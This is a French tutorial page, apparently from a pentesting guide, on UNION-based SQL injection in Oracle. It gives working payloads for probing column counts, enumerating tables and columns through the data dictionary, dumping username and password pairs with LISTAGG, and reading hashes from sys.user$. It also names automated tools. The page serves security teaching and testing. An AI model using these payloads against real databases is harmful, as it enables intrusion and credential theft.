---
order: 12
title: "Injection SQL basée sur UNION dans Oracle"
description: "Utiliser UNION SELECT dans Oracle pour extraire des données : le FROM DUAL obligatoire, la correspondance stricte des types et l'énumération via les vues du dictionnaire de données ALL_."
keywords:
  - injection SQL basée sur union
  - UNION SELECT DUAL
  - all_tables
  - all_tab_columns
  - LISTAGG
---

# Basée sur UNION

Un `UNION SELECT` ajoute des lignes choisies par l'attaquant à un résultat renvoyé. Oracle exige que chaque `SELECT` ait un `FROM`, de sorte que la requête injectée sélectionne `FROM DUAL` (ou depuis une table réelle), et son nombre de colonnes et ses types doivent correspondre à l'original, avec `NULL` comme remplissage agnostique au type.

Détectez le nombre de colonnes avec des ordinaux `ORDER BY` ou des `UNION SELECT NULL FROM DUAL` incrémentaux :

```sql
' ORDER BY 3-- 
' UNION SELECT NULL,NULL,NULL FROM DUAL-- 
```

Un nombre erroné déclenche `ORA-01789: query block has incorrect number of result columns`, et une incompatibilité de type déclenche `ORA-01790` ; utilisez `NULL` jusqu'à ce que la disposition soit correcte, puis placez une chaîne dans la colonne reflétée.

Énumérez via le dictionnaire de données. Les vues `ALL_` montrent tout ce que l'utilisateur courant peut voir :

```sql
' UNION SELECT table_name,NULL,NULL FROM all_tables-- 
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'-- 
```

Les noms de tables et de colonnes sont stockés en majuscules, faites-les donc correspondre en majuscules. Regroupez les lignes dans une seule cellule avec `LISTAGG` (11g R2 et ultérieur) :

```sql
' UNION SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY username),NULL,NULL FROM users-- 
```

Pour une seule ligne, utilisez `WHERE ROWNUM=1` ou `FETCH FIRST 1 ROWS ONLY` (12c+). `all_users` liste les comptes, et `SELECT password FROM sys.user$` expose les empreintes à un utilisateur privilégié.

## Outils

- **sqlmap** : automatise la détection du nombre de colonnes et l'extraction par UNION (`--technique=U`).
- **ghauri** : alternative rapide avec une forte évasion de WAF.
- **sqlplus** (ou SQLcl) : le client Oracle pour valider les charges `UNION SELECT ... FROM DUAL`.

## Références

- Oracle Database SQL Language Reference: UNION, data dictionary, LISTAGG
- OWASP Testing Guide: Testing for SQL Injection
